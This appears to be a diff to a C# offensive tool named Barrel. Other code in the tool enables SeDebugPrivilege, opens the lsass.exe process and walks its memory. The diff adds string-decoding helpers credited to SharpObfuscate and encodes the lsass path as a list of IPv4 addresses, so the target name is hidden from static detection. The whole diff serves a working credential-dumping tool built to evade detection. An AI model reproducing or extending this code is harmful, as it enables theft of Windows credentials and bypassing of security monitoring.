@@ -6,6 +6,8 @@ using System.IO.Compression;
 using System.Collections.Generic;
 using System.Runtime.InteropServices;
 using static Barrel.NT;
+using System.Collections;
+using System.Text;
 
 
 namespace Barrel
@@ -243,6 +245,53 @@ namespace Barrel
         }
 
 
+        // Source: https://github.com/ricardojoserf/SharpObfuscate
+        static byte[] getBytesFromIPv4(string ipv4_str)
+        {
+            int ipv4_size = 4;
+            byte[] ipv4_bytes = new byte[ipv4_size];
+            List<int> Ipv4Vals = ipv4_str.Split('.').Select(int.Parse).ToList();
+            for (int i = 0; i < ipv4_size; i++)
+            {
+                ipv4_bytes[i] = (byte)(Ipv4Vals[i]);
+            }
+            return ipv4_bytes;
+        }
+
+
+        // Source: https://github.com/ricardojoserf/SharpObfuscate
+        public static byte[] ToByteArray(String hexString)
+        {
+            // In case the string length is odd
+            if (hexString.Length % 2 == 1)
+            {
+                Console.WriteLine("[-] Hexadecimal value length is odd, adding a 0.");
+                hexString += "0";
+            }
+            byte[] retval = new byte[hexString.Length / 2];
+            for (int i = 0; i < hexString.Length; i += 2)
+                retval[i / 2] = Convert.ToByte(hexString.Substring(i, 2), 16);
+            return retval;
+        }
+
+
+        // Source: https://github.com/ricardojoserf/SharpObfuscate
+        static string decodeIPv4(List<String> ipv4_str_list)
+        {
+            int ipv4_size = 4;
+            string total_bytes_str = "";
+            foreach (string ipv4_str in ipv4_str_list)
+            {
+                byte[] ipv4_bytes = getBytesFromIPv4(ipv4_str);
+                for (int i = 0; i < ipv4_size; i++)
+                {
+                    total_bytes_str += ipv4_bytes[i].ToString("X2");
+                }
+            }
+            return Encoding.UTF8.GetString(ToByteArray(total_bytes_str)).TrimEnd('\0');
+        }
+
+
         static void Barrel(string json_filename, string zip_filename) {
             // Random seed
             Random random = new Random();
@@ -250,10 +299,14 @@ namespace Barrel
             // Get SeDebugPrivilege
             EnableDebugPrivileges();
 
-            // Get process name
-            string proc_name = "C:\\WINDOWS\\system32\\lsass.exe";
+            // Decode process name (C:\\WINDOWS\\system32\\lsass.exe)
+            List<string> process_name_ipv4_encoded = new List<string> { "67.58.92.87", "73.78.68.79", "87.83.92.115", "121.115.116.101", "109.51.50.92", "108.115.97.115", "115.46.101.120", "101.0.0.0" };
+            string proc_name = decodeIPv4(process_name_ipv4_encoded);
+
+            // Get process handle
             IntPtr processHandle = GetProcessByName(proc_name);
             Console.WriteLine("[+] Process handle:  \t\t\t\t" + processHandle);
+
             // Loop the memory regions
             long proc_max_address_l = (long)0x7FFFFFFEFFFF;
             IntPtr aux_address = IntPtr.Zero;
